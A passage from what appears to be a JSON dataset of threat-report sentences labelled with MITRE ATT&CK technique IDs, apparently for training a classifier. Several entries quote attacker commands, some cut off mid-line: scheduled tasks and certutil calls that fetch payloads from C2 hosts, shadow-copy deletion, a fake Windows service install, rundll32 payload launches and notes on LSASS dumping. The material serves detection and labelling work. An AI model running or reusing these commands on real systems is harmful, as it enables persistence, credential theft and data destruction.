  {
    "type": "text",
    "text": "These tactics have been observed being used by Bitter APT in 2021/2022. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "\"C:\\Windows\\System32\\schtasks.exe\" /create /sc MINUTE /mo 15 /TN \\Windows\\DWM\\DWMCORE /TR \"cmd /c start /min",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "-O \"\"https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&ct=QT\"\"\" /f Figure 4: Scheduled task The second scheduled task created attempts to execute the payload downloaded by the other task: \"C:\\Windows\\System32\\schtasks.exe\" /create /sc MINUTE /mo 20 /TN \\Windows\\DWM\\DWMCORELIB /TR",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The computer name and the username is also sent to the C2. ",
    "command": "",
    "labels": [
      "T1033",
      "T1053.005",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "\"C:\\Windows\\System32\\schtasks.exe\" /create /sc minute /mo 15 /tn",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The decoded command is the following: schtasks /create",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "/tn",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "WinSecurity /sc minute /mo 15 /tr",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "However, the most common method by which threat actors obtain initial access to networks is through the use of compromised valid credential pairs (T1078) and session cookies (T1539), which are often harvested from a successful infostealer infection (T1555, T1083) and sold by specialized initial access brokers on dark web and special-access sources.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These dark web shops and marketplaces specialize in the sale of compromised account credentials, remote desktop protocol (RDP) and secure shell (SSH) accesses, and infostealer malware logs that can be utilized to gain access to a victims network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Since ransomware will encrypt all files on a victim system and often will search for directories on the network (such as networked file shares) to also encrypt, moving highly sensitive customer data to a system with no internet access or access to the rest of the network will minimize ransomwares access to those files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The server contained HTTP header data (SimpleHTTP/0.6 Python/3.8.10), indicating the use of a Python library called SIMPLEHTTPSERVER to serve the files and folders detailed in Figure 1. Figure 1 – Screenshot of exposed threat actor infrastructure showing available tools and target lists.. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The attacker then changed the Cobalt Strike Cat beaconing frequency for behaviour-based evasion by sending the \"sleep 10\" command to the infected host and executed the \"tasklist /SVC\" command to list all running processes on the victim device. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "EclecticIQ researchers observed that the threat actor used the Windows command-line arguments to perform general reconnaissance against infected devices.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"DBPath\" *.* Used to search for the string \"DBPath\" in all files within the current directory and its subdirectories. arp –a Address resolutions for remote systems. netsh wlan show profiles Display a list of all the wireless network profiles. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "dir %APPDATA%\\Microsoft\\Windows\\Recent List of recently opened files and folders on the computer. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Escalate Privileges with Stolen Credentials The threat actor uses stolen passwords from valid accounts as the primary vector for privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These passwords would allow the threat actor to escalate privileges using valid accounts if the accounts were privileged .",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike Cat beacon logs (Figure 12) show that the actor uploaded LaZagne onto the infected device for credential harvesting purposes and deleted the LaZagne binary after execution to avoid detection from the user's side. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Figure 13 – Execution of Hack-browser-data on infected host. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows services ran with the highest privilege, NT AUTHORITY\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\Windows\\Temp\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called “windowsupdate”.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 14 – Installation of malicious Windows service. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.]194) over port 2333. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor installed a second stage persistence backdoor on infected device by abusing Windows Services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities: Taking full control of the infected machine Recording keystrokes in real time with offline logging available Accessing live web cam feeds including microphone recording Downloading files remotely Remote shutdown and reboot Disabling user input Over Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Utilizing I2P, the dropper then downloads a custom XMRig miner and orchestrates the mining operations. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script removes any files that conflict with its randomly generated paths.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script is executed as a /bin/sh subprocess. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script first deletes itself from the disk.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "After the process executes, the I2P dropper script removes the i2pd Mach-O file from the disk. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Public i2pd binaries rely on config files or command line arguments for necessary configuration of tunnels and upstream connections.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The dropper generates and executes a script to download, configure and execute a copy of a XMRig miner.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script is executed as a command line argument passed into a /bin/sh -c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The script then removes any files that conflict with its randomly generated paths. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script then enters a download loop that contains two subloops, one to download the MD5 hash of the XMRig payload, and a second to download the XMRig payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This second subloop performs the same actions but instead pulls the XMRig payload from http://127.0.0[.]1:4445/update.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Similar to the ip2d process, it is executed via an exec -a call utilizing a process name of /System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_local Next, the XMRig Download Script sends the XMRig miner a config via the XMRig miner’s native API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The authors cleverly utilized these legitimate dependencies via symbolic links when dynamically creating the legitimate bundle in the temp folder. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Even though the scripts produce many on-disk artifacts, the dropper and scripts are quick to remove them as soon as they are executed or used.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The mining infrastructure is dropped, downloaded and deleted every time the dropper executes.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "As long as the dropper successfully launches its legitimate application, the user will continue to execute the dropper under the assumption that it is legitimate. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "User Execution (T1204) ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The dropper is executed by the user. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Indicator Removal: File Deletion (T1070.004) ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Files are deleted after use. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "These settings include specifying the size of large files where partial encryption is applied instead of encrypting the entire file, defining the primary path for encryption, specifying file paths to skip during encryption, targeting specific services and processes, configuring autorun entries, enabling auto ransom note opening, and even changing wallpapers on infected systems. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "UAC BYPASS After creating the mutex, the ransomware modifies specific registry values to disable User Access Control (UAC), a security feature in Windows.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "EnableLUA By modifying the below registry value EnableLUA to “0”, malware aims to deactivate User Account Control (UAC) on the target system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5 – List of Services to Stop Prior to encrypting the files, the ransomware uses the FindFirstVolumeW() and FindNextVolumeW() API functions to search and identify accessible volumes on the targeted system.",
    "command": "",
    "labels": [
      "T1083",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once the ransom note has been dropped, the malware proceeds to identify files and directories for encryption by iterating through them using the FindFirstFileW() and FindNextFileW() API functions.",
    "command": "",
    "labels": [
      "T1083",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Within these libraries, the malware leverages various functions from the CryptoAPI, including CryptAcquireContextW(), CryptImportKey(), CryptSetKeyParam(), and CryptEncrypt(). ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Figure 7 – File Encryption In the next step, the malware renames the encrypted files with the extension “.CCBDFHCHFD” and replaces them with the original files using the MoveFileExW() API function, as shown below. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "CommandsDescriptionwmic SHADOWCOPY DELETE /nointeractiveThis command uses the Windows Management Instrumentation Command-line (WMIC) to delete all shadow copies without user interaction.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Its primary purpose is to carry out the encryption process on the victim’s Linux machine by scanning files in a specified or generic path and running the ransomware payload, “164f8295_linux.elf”, on each file it encounters. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "EmptyTrash() – This function is responsible for deleting all files and directories in the user’s trash folder.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "ScanPath(): This function scans a specified path by finding all files within the given directory and its subdirectories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It uses the esxcli command to list all VM processes and forcibly kills them.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "It retrieves the list of NFS volumes using esxcli and then iterates over each volume to find files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ScanVMS() – This function scans VM volumes on an ESXi server.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It retrieves the list of VM volumes using the esxcli command and then iterates over each volume to search for specific files related to virtual machines.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Nevertheless, the intrusion analysis conducted on one of the affected machines indicates that in wave 2 the threat actor did not use a BAT file to invoke the ransomware while supplying seven digits similar to wave 1, but instead invoked the wave 2 ransomware immediately from the command line using six zeroes: “000000”.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "When comparing wave 2 ransomware samples to wave 1, we notice that both have the same , and both use CreateFile and WriteFile APIs to overwrite files.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "So, the wipers had to use a third-party loader such as TDL – a signed loader for unsigned drivers – to install the unsigned raw disk driver that allows the wiper malware to directly access the raw disk for wiping data using DeviceControl API methods.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Finally, for the most part, wave 1 and wave 2 wipers remained the same, including the reliance on the same authentication key to access the raw disk driver, and the use of the same DeviceControl API methods, but with one exception, as shown below.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Wave 1 wiper DeviceControl API methods: IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Wave 2 wiper DeviceControl API methods: IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new method in wave 2; used in multiple instances) IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Based on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon launch, the malicious document connects to the remote server and downloads the payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon infection, the operator executed several Windows commands to gather basic system information.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They then returned 18 hours later to install further malware with high privileges. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Post-exploitation Based on our telemetry, when the malicious Word document opens it fetches the next payload from the remote server: Download URL: http://avid.lno-prima[.]lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI= The fetched payload is supposed to be saved in %Profile%\\update.dll.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "rundll32.exe %Profile%\\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ== Command #2:",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The main difference from the previous shortcut sample was that it fetched an additional script payload (Visual Basic Script or HTML Application); also, a different method of fetching and executing the next stage payload was adopted at this time.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The command below was executed when the victim double-clicked on the shortcut file:cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\\Pass.txt & start %APPDATA%\\Pass.txt && FOR %i IN (%systemroot%\\system32\\msiexec.*)",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "With this trick, the malware can disable the functionalities of EDR/AV products.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes itself with the following commands: Windows Defender: cmd /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "-h \\”[PDF decoy file]\\” & rundll32 \\”[current DLL file path]\\” #1 Bitdefender: cmd /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "timeout /t 10 & rundll32 \\”[current DLL file path]\\” #1 The primary objective of this malware is to fetch the next stage payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If the fetched data by cURL command contains “<html>” and “curl:”, the malware decrypts the payload with a delivered 64-byte RC4 key. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If Avira or Avast are installed, the malware saves the decrypted payload to “%TEMPLATES%\\marcoor.dll” and spawns it with the rundll32.exe command with the payload URL. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "command: exe %TEMPLATES%\\marcoor.dll #1 [payload URL] Otherwise, the malware doesn’t write the payload to the file and injects the fetched payload into the explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, we observed the download and launch of a suspicious batch file.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This script is for executing the PowerShell script via",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "We also observed the context around that batch file in our telemetry.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The batch file name is “What is Blockchain.bat“.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "We acquired the scriptlet of the batch file.xcopy /h",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Unfortunately, we don’t have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on our telemetry – showing the decoy document and fetching the next stage payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "# Create a decoy password file and open it. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "echo {PASSWORD}>%documents%\\Userlink & notepad.exe %documents%\\Userlink # Fetch the payload with cURL command and execute. cmd.exe\" /c",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This malware (MD5 087407551649376d90d1743bac75aac8) spawns a fake password file while fetching a remote payload and executing it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, it creates a fake file (wae.txt) to show a password composed of the string ‘password’ and fetches a payload from the embedded URL and loads it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The WSF ran a VBScript which initiated a PowerShell command to download and execute an intermediate script which then downloaded and executed the Standard IcedID Loader using a non-standard export “init”. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When opened, the OneNote document instructed the recipient to \"open\" the document by double-clicking the button displayed in the OneNote document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "An HTML Application (HTA) file was concealed beneath the \"open\" text which, if clicked, executed the HTA file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The HTA file initiated a PowerShell command used to download and execute an IcedID loader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If the .URL file was opened it would initiate the download of a batch (.bat) file.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The batch file would download and execute an IcedID loader with rundll32 using a non-standard export: \"PluginInit\". ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The domain is decrypted from the configuration and the URI path is decrypted within the function that makes the HTTP request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "With the config decrypted, the malware creates the cookies that contain the host information and sends an HTTP request that will contain the encrypted bot response. ",
    "command": "",
    "labels": [
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "At the time when this distribution URL was live the IP was hosting an open directory on /webdav/ that contained various bat files, a forked IcedID loader as well as this lite loader. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "ReconShark exfiltrates information relevant for conducting subsequent precision attacks, such as deployed detection mechanisms and hardware information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FileName Path RedirSuiteServiceProxy.aspx C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth Xml.ashx C:\\inetpub\\wwwroot\\aspnet_client pxh4HG1v.ashx C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth During the incident response process at another customer, GTSC noted that the attack team used another webshell template Filename: errorEE.aspx SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257 Ref: https://github.com/antonioCoco/SharPyShell Command Execution Besides collecting information on the system, the attacker downloads files, and checks connections through certutil, which is a legitimate tool available in the Windows environment. ",
    "command": "",
    "labels": [
      "T1005",
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "“cmd” /c cd /d \"c:\\\\PerfLogs\"&certutil.exe -urlcache -split -f",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "[S]&cd&echo [E] \"cmd\" /c cd /d \"c:\\\\PerfLogs\"&certutil.exe -urlcache -split -f",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In addition, the hacker also injects malicious DLLs into the memory, drops suspicious files on the attacked servers, and executes these files through WMIC. ",
    "command": "",
    "labels": [
      "T1047",
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The cm.exe file that is dropped into the C:\\PerfLogs\\ folder is the standard Windows command line tool cmd.exe. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Specifically: The Run class creates a listener that listens for connections to port 443 at the path https://*:443/ews/web/webconfig/. After listening, the malware creates a new thread that calls to r. Method r does: - Check whether the received request has data in the body or not, if not then returns result 404. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This method is responsible for collecting system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Information such as operating system architecture, framework version, operating system version, etc.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The array array3 will take the first 2 elements as parameters for method r, which is responsible for executing the command o Case 3: Call to method ld, which is responsible for listing directory and file information in the format D|-|<Date created> |<Date modified> |<folder or file name> o Case 4: Call to method wf, which is responsible for writing files o Case 5: Call to method rf, which is responsible for reading files o Case 6: Create a folder o Case 7: Delete file or folder o Case 8: Moving file o",
    "command": "",
    "labels": [
      "T1070.004",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Victim 1: https://*:443/ews/web/webconfig/ https://*:443/owa/auth/webcccsd/ https://*:444/ews/auto/ https://*:444/ews/web/api/ Victim 2: http://*:80/owa/auth/Current/script/ https://*:443/owa/auth/Current/script/ GTSC also detected that the DLL was injected into the memory of the svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Installing web shells Adding a local user account and elevating privileges to local administrator Installing legitimate remote access tools, such as RPort, Ligolo and eHorus Installing a customized PowerShell script backdoor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Such reconnaissance activities were seen leveraged throughout the attack chain. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These actions mainly involved: Remote scheduled tasks to launch their customized PowerShell backdoor Windows Management Instrumentation (WMI) to launch commands on devices Remote services to run encoded PowerShell commands After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.",
    "command": "",
    "labels": [
      "T1047",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on-premises destructive operations to prepare for large-scale encryption of targeted devices. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "GPO was leveraged again to register a scheduled task used to launch the ransomware payload.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The Azure AD Connector account and the compromised administrator account were then used to perform significant destruction of the Azure environment—deleting within a few hours server farms, virtual machines, storage accounts, and virtual networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Email impersonation The threat actors used the compromised administrator account to grant SMTP Send on behalf permissions to the Azure AD Connector account over a high-ranking employee’s mailbox, using the Set-Mailbox PowerShell cmdlet. Figure 6.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Note: Those files will still get executed, if the user clicks on run! ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "LSASS Dump A side effect of the WebDAV is, that the Defender is not going to delete files correctly on that shared folder. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "As LSASS dumps are nowadays recognized by the dump file itself this is a nice way to get your hands on the file.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This will still trigger an alarm, so absolutely not OPSEC! ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "LSASS dump in c:\\tmp detected and deleted ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
